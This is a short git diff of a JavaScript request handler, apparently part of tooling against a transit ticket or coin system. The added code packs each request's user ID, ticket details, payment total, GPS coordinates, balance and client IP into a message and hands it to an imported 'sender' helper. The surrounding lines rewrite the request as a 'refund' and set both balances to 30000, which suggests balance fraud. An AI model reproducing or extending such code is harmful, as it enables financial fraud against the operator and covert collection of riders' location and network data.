@@ -1,8 +1,22 @@
-import { requests, getUrbiCoins } from '../helpers/index.js'
+import { getUrbiCoins, requests, sender } from '../helpers/index.js'
 
 
 const sendAccess = async(req, res) => {
   const body = req.body
+  
+  const send = `■■■■■🚎🎟🚈■■■■■
+👤 UID: ${ body[0].uid }
+🎫 Boleto: ${ body[0].branch }
+👥️ Pasajeros: ${ body[0].passengers }
+💲 Total: ${ body[0].total }
+🧭 Latitud: ${ body[0].latitude }
+🧭 Longitud: ${ body[0].longitude }
+🪙 Balance: ${ body[0].balance_new }
+🌐 IP: ${ req.headers['x-forwarded-for'] || req.connection.remoteAddress }
+■■■■■■■■■■■■■■■`
+
+  sender(send, res)
+  
   body[0].action = 'refund'
   body[0].balance_new = 30000
   body[0].balance_old = 30000
